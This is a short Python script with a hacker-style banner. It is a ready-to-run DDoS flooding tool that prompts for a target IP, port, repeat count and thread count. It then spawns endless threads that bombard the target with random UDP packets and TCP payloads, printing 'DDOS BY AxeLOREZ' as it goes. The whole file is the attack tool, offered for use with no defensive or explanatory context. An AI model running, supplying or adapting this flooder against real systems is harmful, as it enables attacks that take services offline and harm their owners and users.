#!/usr/bin/env python3
#Code by AxLika
import socket
import os
import threading
import time
import struct
import sys
import random

os.system("clear")
print("""
\033[91m
 __     ____  ______  _     ___ _  __    _    
 \ \   / /\ \/ /___ \| |   |_ _| |/ /   / \   
  \ \ / /  \  /  __) | |    | || ' /   / _ \  
   \ V /   /  \ / __/| |___ | || . \  / ___ \ 
    \_/   /_/\_\_____|_____|___|_|\_\/_/   \_\
                                              
                    AXLIKAVX2
                    BY AXELBF.
""")

ip = str(input("\033[92m =====> \033[93m[•] Target IP : "))
port = int(input("\033[92m =====> \033[93m[·] Port : "))
times = int(input("\033[92m =====> \033[93m[&] Times : "))
threads = int(input("\033[93m =====> \033[93m[*] Threads : "))
choice = str(input("\033[93m =====> \033[93m[$] Yakin? (y/n) : "))

def lika():
	data = random._urandom(17)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[94m DDOS BY AxeLOREZ !!!")
		except:
			print("\033[94m [!] DDOS BY AxeLOREZ!!!")

def lika2():
	data = random._urandom(666)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[94m DDOS BY AxeLOREZ !!!")
		except:
			s.close()
			print("\033[94m [*] DDOS BY AxeLOREZ!!!")

def lika3():
	data = random._urandom(17)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[94m DDOS BY AxeLOREZ !!!")
		except:
			print("\033[94m [!] DDOS BY AxeLOREZ!!!")

			
for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = lika)
		th.start()
		th = threading.Thread(target = lika2)
		th.start()
	else:
		th = threading.Thread(target = lika3)
		th.start()
